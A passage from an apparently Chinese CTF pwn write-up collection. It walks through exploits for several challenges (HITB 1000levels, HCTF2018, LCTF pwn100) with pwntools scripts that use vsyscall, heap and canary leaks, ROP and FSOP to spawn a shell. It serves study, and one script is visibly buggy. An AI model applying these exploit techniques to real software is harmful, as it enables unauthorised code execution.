vtable_offset\n\nfake_vtable = libc_base + fake_vtable_offset\nfake_vtable_setbuf_addr = libc_base + fake_vtable_offset + _setbuf_offset\n\nprint 'libc_base: ',hex(libc_base)\nprint 'one_gadget:',hex(one_gadget)\n\nfor i in range(2):\n    p.send(p64(_IO_2_1_stdout_vtable_addr+i))\n    p.send(p64(fake_vtable)[i])\n\nfor i in range(3):\n    p.send(p64(fake_vtable_setbuf_addr+i))\n    p.send(p64(one_gadget)[i])\n\np.sendline(\"exec /bin/sh 1>&0\")\n\np.interactive()\n```\n\n \n\n(2)_IO_FILE_plus结构体位于libc数据段上可读可写内存处，可以直接修改，但是修改字节数只有5个，按照第一种方法：\n\n```\n#注释头\n\n_IO_FILE_plus._mode <= 0  //该条件自动就会满足\n_IO_FILE_plus._IO_write_ptr > _IO_FILE_plus._IO_write_base//该条件需要设置1个字节\n```\n\n再利用1个字节修改vtable的倒数第二个字节，伪造vtable指针，然后利用3个字节在该内存对应_setbuf函数偏移处伪造one_gadget地址。\n\n(3)_rtld_global结构体位于libc数据段上可读可写内存处，可以直接修改。那么直接修改_dl_rtld_lock_recursive函数指针指向one_gadget就行了。\n\n \n\n方法(2)和方法(3)参考：\n\nhttps://blog.csdn.net/Mira_Hu/article/details/103736917\n\n \n\n参考资料：\n\nhttps://wiki.x10sec.org/pwn/linux/io_file/fake-vtable-exploit-zh/\n\n \n","tags":["First"],"categories":["PWN","FSOP0xe"]},{"title":"HITB GSEC CTF 2017-1000levels","url":"/2021/08/14/HITB GSEC CTF 2017-1000levels/","content":"\n1.与之前BCTF 2017-100levels一模一样，只不过最大值变成了1000关，所以这里也同样可以用爆破来做，但是可以用另一种方法，vsyscall。\n\n2.进入IDA可以看到有一个hint函数，而且里面有system函数，但是很奇怪：\n\n```\n#注释头\n\nsprintf((char *)&v1, \"Hint: %p\\n\", &system, &system);\n```\n\n这个代码没怎么看懂，还是看下汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531418.jpeg)\n\n这里就是将system的地址赋值给rax，然后rax给栈上的[rbp+var_110]赋值。之后也没有什么其它的更改栈上[rbp+var_110]的操作，所以进入hint函数之后，一定会将system函数放到栈上，通过调试也可以看出来。\n\n3.之后进入go函数，发现如果第一次输入负数，原本将关卡数赋值给[rbp+var_110]的操作就不会被执行，那么[rbp+var_110]上保存的仍然是system函数的地址。之后再输入关卡数，直接加到[rbp+var_110]上，那么如果第一次输入负数，第二次输入system函数和one_gadget的偏移，那么就变相将[rbp+var_110]上存放的内容保存为one_gadget的地址。\n\n▲这里需要注意的是，[rbp+var_110]是在hint函数中被赋值的，而go函数中用到的也是[rbp+var_110]这个变量，但是不同函数栈肯定是不同的，所以这里两个[rbp+var_110]是不是一样的就值得思考一下。看程序可以发现，hint函数和go函数都是在main函数中调用的，那么如果调用的时候两处的rsp是一样的就可以保证两个函数的rbp一样，也就代码[rbp+var_110]也是一样的。查看汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531579.jpeg)\n\n可以看到从读取选项数据之后，到判断语句一直没有push,pop之类的操作，也就是说程序无论是运行到hint函数还是go函数时，main函数栈的状态都是一样的，从而导致进入这两个函数中的栈底也都是同一个地址，那么[rbp+var_110]也就一样，所以用hint函数来为[rbp+var_110]赋值成system函数，再用go函数来为[rbp+var_110]赋值为one_gadget这条路是可以的，同样可以调试来确定一下。\n\n4.那么赋值之后进入level关卡函数，由于递归关系，最后一关的栈是和go函数的栈连在一起的，所以可以通过最后一关的栈溢出抵达go函数的栈，从而抵达[rbp+var_110]这个地址处。\n\n5.但是栈溢出只能修改数据，就算控制eip，但是也并不知道[rbp+var_110]处的真实地址，只能通过调试来知道偏移是多少。所以这里需要用的vsyscall来将rsp下挪到[rbp+var_110]处从而执行vsyscall的ret操作来执行[rbp+var_110]处的代码，也就是one_gadget。\n\n6.这里看一下vsyscall处的数据：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531595.png)\n\n▲vsyscall的特点：\n\n(1)某些版本存在，需要用到gdb来查看，IDA中默认不可见。\n\n(2)地址不受到ASLR和PIE的影响，固定是0xffffffffff600000-0xffffffffff601000。\n\n(3)不能从中间进入，只能从函数开头进入，意味着不能直接调用里面的syscall。这里vsyscall分为三个函数，从上到下依次是\n\nA.gettimeofday: 0xffffffffff600000\n\nB.time: 0xffffffffff600400\n\nC.getcpu: 0xffffffffff600800\n\n(4)gettimeofday函数执行成功时返回值就是0，保存在rax寄存器中。这就为某些one_gadget创造了条件。\n\n7.观察代码可以发现，三个函数执行成功之后相当于一个ret操作，所以如果我们将gettimeofday放在eip处，那么就相当于放了一个ret操作上去，而ret操作又相当于pop  eip，那么就相当于直接将rsp往下拉了一个单位。如果我们多次调用gettimeofday，那么就可以将rsp下拉多个单位，从而抵达我们想要的地方来执行代码。那么这里就可以将eip改成gettimeofday，然后在之后添加多个gettimeofday来滑到one_gadget来执行代码。\n\n8.所以现在就可以编写exp了\n\n(1)前置内容：\n\n```\n#注释头\n\nlibc_system_offset = 0x432C0\t\t\t\t\t\n#减去system函数离libc开头的偏移\none_gadget_offset = 0x43158\t\t\t\t\n#加上one gadget rce离libc开头的偏移\nvsyscall_gettimeofday = 0xffffffffff600000\n\nio.recvuntil('Choice:')\nio.sendline('2') #让system的地址进入栈中\nio.recvuntil('Choice:')\nio.sendline('1') #调用go()\nio.recvuntil('How many levels?')\nio.sendline('-1') #输入的值必须小于0，防止覆盖掉system的地址\nio.recvuntil('Any more?')\nio.sendline(str(one_gadget_offset-libc_system_offset))\t\t\n#第二次输入关卡的时候输入偏移值，从而通过相加将system的地址变为one gadget rce的地址\n```\n\n这里由于相加关系，levels=system_addr + one_gadget_offset - libc_system_offset,肯定超过999，所以关卡数一定是1000关。\n\n(2)开始循环答题，直至到达最后一关执行栈溢出：\n\n```\n#注释头\n\ndef answer():\n    io.recvuntil('Question: ') \n    answer = eval(io.recvuntil(' = ')[:-3])\n    io.recvuntil('Answer:')\n    io.sendline(str(answer))\nfor i in range(999): #循环答题\n    log.info(i)\n    answer()\n```\n\n(3)最后一关执行栈溢出，利用gettimeofday滑至one_gadegt从而getshell。\n\n```\n#注释头\n\nio.recvuntil('Question: ')\nio.send(b'a'*0x38 + p64(vsyscall_gettimeofday)*3)\nio.interactive()\n```\n\n▲以下是测试[rbp+var_110]的数据：\n\nmain函数中的rbp:  00007FFD3A854900\n\nhint函数中的rbp:   00007FFD3A8548C0\n\ngo函数中的rbp:    00007FFD3A8548C0\n\n▲vsyscall用法:\n\nvsyscall直接进行syscall，并没有利用栈空间，所以在处理栈溢出，但是由于PIE没有别的地址可以用时，而栈上又有某个有用的地址的时候，可以通过vsyscall构造一个rop链来ret，每次ret都会消耗掉一个地址，将rsp下拉一个单位，这样就可以逐渐去贴近想要的那个地址，最后成功ret到相应的位置。\n\n▲vdso的特点：\n\n(1)vdso的地址随机化的，且其中的指令可以任意执行，不需要从入口开始。\n\n(2)相比于栈和其他的ASLR，vdso的随机化非常的弱，对于32的系统来说，有1/256的概率命中。\n\n(3)不同的内核随机程度不同：\n\nA.较旧版本：`0xf76d9000`-`0xf77ce000`\n\nB.较新版本：`0xf7ed0000`-`0xf7fd0000`\n\nC.其它版本：\n\n可以编译以下文件之后用脚本查看：\n\n```\n//注释头\n\n// compiled: gcc -g -m32 vdso_addr.c -o vdso_addr\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main()\n{\n    printf(\"vdso addr: %124$p\\n\");//这里的偏移不同内核不一样，可调试一下看看。\n    return 0;\n}\n```\n\n查看脚本：\n\n\\#注释头\n\n```\n#!/usr/bin/python\n# -*- coding:utf-8 -*-\n\nimport os\n\nresult = []\nfor i in range(100):\n    result += [os.popen('./vdso_addr').read()[:-1]]\n\nresult = sorted(result)\n\nfor v in result:\n    print (v)\n```\n\n▲vdso的用法：与vsystem类似，泄露出地址后相当于有了syscall。另外32位条件下有__kernel_rt_sigreturn，可以打SROP。\n\n \n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://xz.aliyun.com/t/5236\n\n \n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"HCTF2018_the_end","url":"/2021/08/14/HITBCTF2017 Sentosa/","content":"\n1.常规checksec，保护全开。IDA打开找漏洞，在sub_BF0()函数，即读入name的函数中存在栈溢出漏洞：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191514947.jpeg)\n\n利用结构体重整化\n\n```\n#注释头\n\nstruct project{\nint length;\nchar name[length];\nint check;\nint price;\nint area;\nint capactity;\n}project;\n\nstruct project* projects[0x10];\n```\n\n由于length是由用户输入影响的，那么结构体的大小也是不固定的，所以提出来固定的形成project_behind结构体方便查看：\n\n```\n#注释头\n\nstruct project_behind{\nint check;\nint price;\nint area;\nint capactity;\n}project_behind;\n```\n\n得到如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191514952.jpeg)\n\n其实际意义就是读入length-1个字节，然后将最后一个字节设置为\\x00。但是这里没有检查data_length，即如果传入的length为0，那么data_length由于是int类型，而i也是int类型，那么i从0开始加需要加0xfffff.....这么多才会抵达-1，相当于可以读入任意长度的字符串，造成栈溢出。\n\n2.栈溢出，保护全开，canary把着栈溢出的口子，所以得先想办法泄露canary。\n\n(1)题目虽然打印了name，但是打印的是堆上的name，没办法利用name连上canary来泄露。\n\n(2)足够长的栈溢出，但是没有这个进程是fork创建，而不是进程pthread创建，所以没办法溢出足够长来覆盖TSL中的canary。\n\n那么既然能控制栈，就从栈上入手，寻找add函数栈上的有用数据：\n\n```\n#注释头\n\nchar *project; // [rsp+6Ah] [rbp-3Eh]\n-------------------------------------------------------------------\nproject = malloc(length + 21LL);\n--------------------------------------------------------------------\nprojects[idx] = project;\n```\n\n可以看到对IDA重整化之后的内容中，project变量位于栈上，里面保存着project这个chunk的首地址，最后会被放入projects这个数组中。所以如果我们修改掉project变量的内容，将其指向其它的地址，那就实现任意地址可写了。\n\n3.但是这里保护全开，一个有用地址都没有。可以注意到project变量最后会保存一个堆地址，由于大端序，如果我们将这个堆地址的最后一个字节变成\\x00，那么这个chunk就会指向第一个chunk，也就是project[0]，如果第一个chunk处于释放状态，就可以通过程序的view函数来将这个chunk的fd指针打印出来。\n\n4.由于使用溢出的前提条件是length为0，所以malloc(21)对应chunk大小为0x20，释放后会进入fastbins中，fastbins中chunk的fd保存下一个chunk的头地址。那么就可以打印出fd上的内容，泄露出堆地址。\n\n5.现在可以控制堆内容了，那么通过正常手段申请几个chunk，在里面构造一个fakechunk，之后利用溢出漏洞控制这个fakechunk，将其释放掉，使其进入unsortedbin中。再利用溢出漏洞控制这个被释放的fakechunk，打印出其fd指针，就是main_aren+88的地址，从而泄露Libc地址。\n\n6.现在有了libc地址和栈溢出，需要突破canary，突破口是environ这个变量。environ这个变量从程序加载时保存在libc数据段上，但是它的内容保存的是栈地址，所以我们就可以通过溢出漏洞打印出environ中的栈地址。得到栈地址之后就可以用gdb计算偏移，选取view函数栈上的canary，再利用溢出漏洞打印出canary的值。\n\n7.之后有了libc,canary,栈溢出,就是常规的getshell了。\n\n8.编写exp:\n\n(1)前置增删改查：\n\n```\n#注释头\n\ndef start_proj(length, name, price, area, capacity):\n    io.sendlineafter(\"Exit\\n\", '1')\n    io.sendlineafter(\"name: \", str(length))\n    io.sendlineafter(\"name: \", name)\n    io.sendlineafter(\"price: \", str(price))\n    io.sendlineafter(\"area: \", str(area))\n    io.sendlineafter(\"capacity: \", str(capacity))\n\ndef view_proj():\n    io.sendlineafter(\"Exit\\n\", '2')\n\ndef cancel_proj(idx):\n    io.sendlineafter(\"Exit\\n\", '4')\n    io.sendlineafter(\"number: \", str(idx))\n```\n\n(2)泄露堆地址：\n\n```\n#注释头 \n\ndef leak_heap():\n    global heap_base\n\n    start_proj(0, 'A', 1, 1, 1)        #chunk0\n    start_proj(0, 'A'*0x5a, 1, 1, 1)   #chunk1\n    #溢出一个字节，修改栈上project的最后一个字节为\\x00,使其指向chunk0\n    start_proj(0, 'A', 1, 1, 1)        #chunk2\n    cancel_proj(2)\n    cancel_proj(0)\n\n    view_proj()\n    #打印chunk1就相当于打印chunk0的内容，其中包含fd指针部分内容\n\n    io.recvuntil(\"Capacity: \")\n    leak = int(io.recvline()[:-1], 10) & 0xffffffff\n    heap_base = (0x55<<40) + (leak<<8) # 0x55 or 0x56\n    #由于程序的关系，只能打印出0x55之后的内容，共4个字节，由于堆地址高位一般都是0x55或0x56，所以直接加上即可，最后还得乘上0x100，因为没有泄露出来，需要调试看看。\n\n    log.info(\"heap base: 0x%x\" % heap_base)\n```\n\n(3)泄露libc地址：\n\n```\n#注释头 \n\ndef leak_libc():\n    global libc_base\n\n    start_proj(0xf, 'A', 0xd1, 0, 0x64)                       #chunk0\n    #chunk0用来修改fakechunk的size位为0xd1,占位0x30,位于heap_base+0x60\n\n    start_proj(0x50, '\\x01', 1, 1, 1)                         #chunk2\n    #chunk2占位0x70用,位于heap_base+0x90,'\\x01'不知道干啥的，'\\x00'随便啥都可以\n\n    start_proj(0x50, 'A'*0x44+'\\x21', 1, 1, 1)                #chunk3\n    #chunk3用来修改fakechunk的size位，占位0x70,位于heap_base+0x100\n\n    start_proj(0, 'A'*0x5a + p64(heap_base+0x90), 1, 1, 1)    #chunk4\n    #chunk4修改chunk4指向heap_base+0x90，占位0x20,位于heap_base\n\n    start_proj(0, 'A'*0x5a + p64(heap_base+0x8b), 1, 1, 1)    #chunk5\n    #chunk5占位0x20,修改chunk5指向heap_base+0x8b,位于heap_base+0x40\n\n    #将fakechunk放入unsortedbin中\n    cancel_proj(4)\n    \n    #获得libc地址\n    view_proj()\n\n    #由于一次只能泄露4个字节，所以需要两部分拼接\n    for i in range(5):\n        io.recvuntil(\"Area: \")\n    leak_low = int(io.recvline()[:-1], 10) & 0xffffffff\n    io.recvuntil(\"Capacity: \")\n    leak_high = int(io.recvline()[:-1], 10) & 0xffff\n    libc_base = leak_low + (leak_high<<32) - 0x3c3b78\n\n    log.info(\"libc base: 0x%x\" % libc_base)\n```\n\n①chunk0中的0x64用来过程序中删除project函数的检查：\n\nif ( *(project + *project + 5) != 1 )\n\n只要计算之后check为1即可，实测0x60也可以。\n\n②chunk3中的\\x21为了过glibc中的检查。\n\n③chunk5为了填满之前的索引为2的project，方便之后运作。\n\n(4)泄露canary:\n\n```\n#注释头 \n\ndef leak_stack_canary():\n    global canary\n\n    environ_addr = libc.symbols['__environ'] + libc_base\n    log.info(\"__environ address: 0x%x\" % environ_addr)\n\n    start_proj(0, 'A'*0x5a + p64(environ_addr - 9) , 1, 1, 1) # 4\n\n    view_proj()\n    for i in range(5):\n        io.recvuntil(\"Price: \")\n    leak_low = int(io.recvline()[:-1], 10) & 0xffffffff\n    io.recvuntil(\"Area: \")\n    leak_high = int(io.recvline()[:-1], 10) & 0xffff\n    stack_addr = leak_low + (leak_high<<32)\n    canary_addr = stack_addr - 0x130\n\n    log.info(\"stack address: 0x%x\" % stack_addr)\n    log.info(\"canary address: 0x%x\" % canary_addr)\n\n    start_proj(0, 'A'*0x5a + p64(canary_addr - 3), 1, 1, 1) # 6\n\n    view_proj()\n    for i in range(7):\n        io.recvuntil(\"Project: \")\n    canary = (u64(io.recvline()[:-1] + \"\\x00\"))<<8\n\n    log.info(\"canary: 0x%x\" % canary)\n```\n\n(5)栈溢出覆盖返回地址为system，pop rdi传参getshell\n\n```\n#注释头 \n\npop_rdi_ret = libc_base + 0x21102\nbin_sh = libc_base + next(libc.search('/bin/sh\\x00'))\nsystem_addr = libc_base + libc.symbols['system']\n\npayload = \"A\" * 0x68\npayload += p64(canary) # canary\npayload += \"A\" * 0x28\npayload += p64(pop_rdi_ret) # return address\npayload += p64(bin_sh)\npayload += p64(system_addr) # system(\"/bin/sh\")\n\nstart_proj(0, payload, 1, 1, 1)\n\nio.interactive()\n```\n\n \n\n▲这道题需要很多调试的地方，容易头大崩溃。\n\n参考资料：\n\nctf-all-in-one\n\n \n\n \n\n \n\n \n\n \n\n \n\n \n","tags":["Heap-Skill"],"categories":["PWN","pwn堆-刷题技巧"]},{"title":"LCTF 2016-pwn100_without_libc","url":"/2021/08/14/LCTF 2016-pwn100_without_libc/","content":"\n1.与之前做的pwn100一模一样，只是之前有给Libc，这次没给Libc。栈溢出，选择用Puts函数来泄露地址从而再执行栈溢出来重复使用。\n\n2.编写leak函数，由于用Puts函数打印，所以需要有个循环条件，具体原因可以查看之前写的。\n\n```\n#注释头\n\ndef leak(addr):\n    count = 0\n    up = ''\n    content = ''\n    payload = 'A'*72 #padding\n    payload += p64(pop_rdi) #给puts()赋值\n    payload += p64(addr) #leak函数的参数addr\n    payload += p64(puts_addr) #调用puts()函数\n    payload += p64(start_addr) #跳转到start，恢复栈\n    payload = payload.ljust(200, 'B') #padding\n    io.send(payload)\n    io.recvuntil(\"bye~\\n\")\n    while True: #无限循环读取，防止recv()读取输出不全\n        c = io.recv(numb=1, timeout=0.1) #每次读取一个字节，设置超时时间确保没有遗漏\n        count += 1\n        if up == '\\n' and c == \"\": #上一个字符是回车且读不到其他字符，说明读完了\n            data = data[:-1]+'\\x00' #最后一个字符置为\\x00\n            break\n        else:\n            data += c #拼接输出\n            up = c #保存最后一个字符\n    data = data[:4] #截取输出的一段作为返回值，提供给DynELF处理\nlog.info(\"%#x => %s\" % (addr, (data or '').encode('hex')))\nreturn data\n```\n\n3.得到system_addr的地址后，后续的操作用万能gadget和read函数即可实现。如果还需要其它地址，也可以通过此方法来打印，也是一样的。\n\n(参照之前不给Libc的pwn100)\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"LCTF 2016-pwn100","url":"/2021/08/14/LCTF 2016-pwn100/","content":"\n \n\n1.常规checksec，开了NX保护。打开IDA，找漏洞，逐次进入后，sub_40068E()函数中的sub_40063D函数中存在栈溢出：\n\n```\n#注释头\n\n\nchar v1; // [rsp+0h] [rbp-40h]\n---------------------------------------------\nsub_40063D((__int64)&v1, 200);\n--------------------------------------------------------------------\nfor ( i = 0; ; ++i )\n{\n    result = i;\n    if ( (signed int)i >= a2 )\n      break;\n    read(0, (void *)((signed int)i + a1), 1uLL);\n}\n```\n\n这里传的是局部变量v1的地址，所以进入sub_40063D后，修改a1指针对应的内存的值其实就是修改之前局部变量v1的值，就是传指针。这个函数每次读取一个字节，直到读取满200字节，其实就可以直接把它当成read(v1,200)完事。\n\n(题外话：汇编代码中当局部变量传参时，需要用到lea，即：lea   rax, [rbp+var_40]，就是将栈上的变量var_40的地址给rax，然后传参mov   rdi, rax；利用rdi来传函数参数。进入到函数内部后就会有：mov   [rbp+var_18], rdi，也就是在该函数栈上创建一个局部变量来保存传入变量的栈上的地址，也就是之前var_40的栈上地址，保存在[rbp+var_18]这个局部变量中。这是这个程序中，不同程序可能不太一样。)\n\n2.所以这个栈溢出的覆盖返回地址应该是sub_40068E函数的返回地址，简单远程调试一下，看看v1所在栈地址和rbp下一地址的距离就是偏移量，为0x48，看汇编计算就可以得到0x40+0x8。\n\n3.现在需要system和binsh，这个程序中这两个都没有带，而只有Libc中才有，但是这个程序并没有泄露Libc的地址。分析程序发现，程序中.plt段中导入了puts函数，IDA中函数名那一块可以看到：所以可以用pwntools中的DynELF，调用该puts函数，从而泄露出libc中puts或者read的地址。由于大多教程选择泄露read，所以这里选择泄露puts函数在Libc中的被加载的地址。这里用read,setbuf,甚至__libc_start_main函数也都可以，因为都导入了plt表和外部引用了。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552597.png)\n\n4.开始构造泄露地址的第一段payload:\n\n```\n#注释头\n\npayload = \"A\"*72            #padding\npayload += p64(pop_rdi)      \n#由于需要向puts传参，所以用到该地址，可以使用ropgadget\n#查询ROPgadget --binary pwn100 | grep \"pop rdi ; ret\"\n#或者在万能gadget中的pop r15，用D命令转换成数据后再C命令转换回代码可以看到\npayload += p64(puts_got)\n#这是puts在.got表(.got.plt段)中的地址，是传递给Puts函数的参数，当该库函数被加载进入libc中\n#时，这样传参进去再打印就可以打印出puts函数在libc中的地址，也就泄露出来了。\npayload += p64(puts_addr)\n#这是调用puts函数，elf.plt['puts']（.plt段）\npayload += p64(start_addr)\n#整个程序的起始代码段，用以恢复栈。这个函数中会调用main函数。这里用Mian函数地#址也可以\npayload = payload.ljust(200, b\"B\")\n#使用B填充200字节中除去先前payload剩余的空间，填充的原因是因为这个程序需要我们输入满200字节\n#才会跳出循环，进而才有覆盖返回地址的可能。或者可以写成：\n#(payload += 'a'*(200-0x48-32))\n```\n\n5.之后开始运行payload来实际得到Puts函数被libc加载的实际内存地址：\n\n```\n#注释头\n\nio.send(payload)\nio.recvuntil('bye~\\n')#跳出循环后才会执行到打印bye的地方\nputs_addr = u64(io.recv()[:-1].ljust(8, b'\\x00'))\n#这里就是接收泄露地址的地方，末尾需要填充上\\x00\nlog.info(\"puts_addr = %#x\", puts_addr)\nsystem_addr = puts_addr - 0xb31e0\nlog.info(\"system_addr = %#x\", system_addr)\n```\n\n6.现在得到了puts函数被libc加载的实际内存地址，那么puts函数与其它函数的偏移量也就可以通过用IDA打开题目给的libc查出来，从而得到其它我们需要的函数被libc加载的实际内存地址。\n\n```\n#注释头\n\n00000000000456A0  ---system_in_libc\n00000000000F8880 ---read_in_libc\n0000000000070920  ---puts_in_libc\n000000000018AC40 ---binsh_in_libc\n```\n\n得到libc被加载的首地址：puts_addr 减去 puts_in_libc 等于libc_start。于是libc_start加上各自函数对应的in_libc也就可以得到被libc加载的实际内存地址。\n\n7.现在都有了就可以尝试在执行一次栈溢出来开shell，64位程序，有了system函数和binsh地址，那么栈溢出覆盖用pop rdi;ret的方法可以直接getshell。\n\n8.这里假设没有binsh，来使用一下万能gadget：通过我们的输入读到内存中。同样这张图，万能Gadget1为loc_400616，万能Gadget2为loc_400600\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552166.png)\n\n以下为用来读取binsh字符串的代码，这里需要在程序中找到一段可以写入之后不会被程序自动修改的内存，也就是binsh_addr=0x60107c，这个地址其实是extern的地址，里面原来保存的内容是read函数发生延迟绑定之前的地址。而延迟绑定发生之后，got表中保存的内容已经被改成了被Libc加载的真实地址，这个extern也就没用了，可以随意用。但如果某个函数没有被首次调用，即还没发生延迟绑定，而我们却先一步改掉了extern的内容，那么它就再也没办法被调用了。\n\n```\n#注释头\n\n\nbinsh_addr = 0x60107c\t\t\t\n#bss放了STDIN和STDOUT的FILE结构体，修改会导致程序崩溃\n\npayload = b\"A\"*72\npayload += p64(universal_gadget1) #万能gadget1\npayload += p64(0) #rbx = 0\npayload += p64(1)\n#rbp = 1，过掉后面万能gadget2的call返回后的判断,使它步进行跳转，而是顺序执行到万\n#能gadget1，从而return到最开始来再执行栈溢出从而Getshell。\n#cmp 算术减法运算结果为零,就把ZF(零标志)置1,cmp a b即进行运算a-b\npayload += p64(read_got)\n#r12 = got表中read函数项，里面是read函数的真正地址，直接通过call调用\npayload += p64(8) #r13 = 8，read函数读取的字节数，万能gadget2赋值给rdx\npayload += p64(binsh_addr) #r14 = read函数读取/bin/sh保存的地址，万能gadget2赋值给rsi\npayload += p64(0)\n#r15 = 0，read函数的参数fd，即STDIN，万能gadget2赋值给edi\npayload += p64(universal_gadget2) #万能gadget2\npayload += b'\\x00'*56\n#万能gadget2后接判断语句，过掉之后是万能gadget1，而Loc_400616万能gadget1执行之\n#后会使得栈空间减少7*8个字节，所以我们需要提前输入7*8来使得万能gadget1执行之\n#后栈的位置不发生变化，从而能正常ret之后接上的start_addr\n#用于填充栈，这里用A也是一样\npayload += p64(start_addr) #跳转到start，恢复栈\npayload = payload.ljust(200, b\"B\") #padding\n#不知道这有什么用，去掉一样可以getshell，因为这边是直接调用read函数，而不是经过\n#sub_40068E()非得注满200字节才能跳出循环。\n\nio.send(payload)\nio.send(b\"/bin/sh\\x00\")\n#上面的一段payload调用了read函数读取\"/bin/sh\\x00\"，这里发送字符串\n#之后回到程序起始位置start\n```\n\n这里万能Gadget中给r12赋值，传入的一定是该函数的got表，因为这里的call和常规的call有点不太一样。我们在IDA调试时按下D转换成硬编码形式，(这里可以在IDA中选项-常规-反汇编-操作码字节数设置为8)可以看到这个call的硬编码是FF，而常规的call硬编码是E8。(这里call硬编码之后的字节代表的是合并程序段之前的偏移量，具体可以参考静态编译、动态编译、链接方面的知识)在这个指令集下面：\n\nFF的call后面跟的是地址的地址。例如call [func], 跳转的地方就应该是func这个地址里保存的内容，也就是*func。\n\nE8的call后面跟的是地址。例如call func，跳转的地方就是func的开头。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552928.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552607.jpeg)\n\n这里可以不用非得看硬编码，可以直接看汇编也可以显示出来：一个有[],一个没有[]。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552863.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552842.jpeg)\n\n9.所以万能gadget中通过r12，传入跳转函数的地址只能是发生延迟绑定之后的got表地址，而不能是plt表地址或者是没有发生延迟绑定的got表地址，(延迟绑定只能通过plt表来操作，没有发生延迟绑定之前，该got表中的内容是等同于无效的，只是一个extern段的偏移地址，除非该函数func是静态编译进程序里面的，那么got表中的内容就是该函数的真实有效地址，不会发生延迟绑定。)因为plt表中的内容转换成硬编码压根就不是一个有效地址，更别说跳转到该地址保存的内容的地方了。有人说跳转到plt表执行的就是跳转got表，那应该是一样的啊，但FF的call并不是跳转到plt来执行里面的代码，而是取plt表中内容当作一个地址再跳转到该地址来执行代码，所以有时候需要看汇编代码来决定究竟是传入got表还是传入plt表。同样也可以看到plt表中的硬编码是FF，也就是并不是跳转got表，而是取got表中保存的内容当作一个地址再来跳转。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552806.jpeg)\n\n▲说了这么多，记住一个就行了，\n\n需要跳转函数时，有[]的-只能传got表，没[]的-传plt表(plt表更安全好使，但后面格式化字符串劫持got表又有点不太一样，情况比较复杂)。\n\n需要打印真实函数地址时，传的一定是got表，这样就一定没错。\n\n当有call eax;这类语句时，eax中保存的一定得是一个有效地址，因为这里的call硬编码也是0FF。(实际情况got和plt来回调着用呗，哪个好使用哪个)\n\n10.那么现在有了system_addr和binsh_addr，而程序又是从最开始运行，所以现在尝试getshell：\n\n```\n#注释头\n\npayload = b\"A\"*72 #padding\npayload += p64(pop_rdi) #给system函数传参\npayload += p64(binsh_addr) #rdi = &(\"/bin/sh\\x00\")\npayload += p64(system_addr) #调用system函数执行system(\"/bin/sh\")\npayload = payload.ljust(200, b\"B\") #padding，跳出循环\nio.send(payload)\nio.interactive()\n```\n\n11.另外由于在libc中查找也比较繁琐，所以有个libcSearch可以简化使用，具体查资料吧。\n\n \n\n▲\n\n1.往puts函数中传入函数在got表中的地址（elf.got）参数可以打印出被加载在Libc中的实际内存地址。\n\n2.用覆盖返回地址ret的形式调用函数需要用函数在plt表中的地址，（elf.plt）这是库函数地址，需要先到plt中，然后再到got表中，这是正常的函数调用。\n\n3.但如果在gadget中，则可以通过给r12赋值来调用elf.got表中的函数，因为这个是call qword ptr[r12+rbx*8]，指向的是函数在got表中真实地址，需要的是函数在got表中的地址。如果只是call addr，则应该是call函数在plt表中的地址。\n\n4.万能gadget一般在_libc_csu_init中，或者init或者直接ROPgadget查也可以\n\n \n\n▲mov和lea区别：\n\nmov:对于变量，加不加[]都表示取值；对于寄存器而言，无[]表示取值，有[]表示取地址。\n\nlea:对于变量，其后面的有无[]皆可，都表示取变量地址，相当于指针。对于寄存器而言，无[]表示取地址，有[]表示取值。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"Learn_malloc.c_before","url":"/2021/08/14/Learn_malloc.c_before/","content":"\n一、环境部署：\n\n```\n#注释头\n\ndocker pull ubuntu:16.04\ndocker pull ubuntu:18.04\ndocker pull ubuntu:20.04\n```\n\n二、环境安装:\n\n1.apt换源，docker换源，pip换源。\n\n2.安装前置包：\n\n```\n#注释头\n\nsudo apt-get install libxml2-dev\nsudo apt-get install libxslt-dev\nsudo apt-get install libmysqlclient-dev\nsudo apt-get install libsqlite3-dev\nsudo apt-get install zlib1g-dev\nsudo apt-get install python-dev\nsudo apt-get install libffi-dev\nsudo apt-get install libssl-dev\n```\n\n3.安装python好多步部曲：\n\n```\n#注释头\n\nwget https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz\n(wget https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tgz)\ntar -zxvf Python-2.7.9.tgz\ncd Python-2.7.9\n./configure --prefix=/usr/local/python27\nmake\nmake install\nln -s /usr/local/python27/bin/python /usr/bin/python2\n```\n\n4.安装setuptools四部曲：\n\n```\n#注释头\n\nwget https://pypi.python.org/packages/45/29/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-36.6.0.zip#md5=74663b15117d9a2cc5295d76011e6fd1\nunzip setuptools-36.6.0.zip\ncd setuptools-36.6.0\npython2 setup.py install\n```\n\n5.安装pip四部曲：\n\n```\n#注释头\n\nwget 